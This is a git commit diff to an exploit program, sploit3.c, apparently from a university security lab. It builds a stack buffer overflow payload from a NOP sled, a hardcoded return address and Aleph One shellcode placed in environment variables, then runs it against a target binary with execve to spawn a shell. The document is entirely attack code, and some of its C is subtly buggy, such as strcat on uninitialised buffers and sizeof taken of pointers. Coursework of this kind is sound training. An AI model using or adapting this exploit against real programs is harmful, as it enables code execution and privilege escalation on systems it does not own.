33675c54aa1701a5812c0486845c83fea7f18006
Adam Levin <awl44@me.com>
2019-11-29 21:59:45 -0800

    sploit3

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -12,21 +12,32 @@ int main(void)
   char *args[3]; 
   char *env[1];
 
-   //bfffffa1
-  char *address = "\xa1\xff\xff\xbf";
-  char *result = malloc(sizeof(address) + 1);
-  strcat(result, address);
+  //bfffff9c
+  char *nops = "\x90\x90\x90";
+  char *result = malloc(sizeof(nops) + 1);
+  strcat(result, nops);
 
+  char *preface1 = "rrrrrrrrrrr=\xa0\xff\xff\xbf";
   char *preface = "shellcode=";
-  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+1);
+
+  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+16);
   strcat(envvar, preface);
+  strcat(envvar, "\x90\x90\x90\x90");
+  strcat(envvar, "\xa8\xff\xff\xbf");
   strcat(envvar, shellcodeAlephOne);
+
+  char *envp[] =
+    {
+        preface1,
+        envvar
+    };
+
   args[0] = TARGET;
   args[1] = result;
   args[2] = NULL;
   
-  env[0] = envvar;
-  execve(TARGET, args, env);
+  // env[0] = envvar;
+  execve(TARGET, args, envp);
   fprintf(stderr, "execve failed.\n");
 
   return 0;
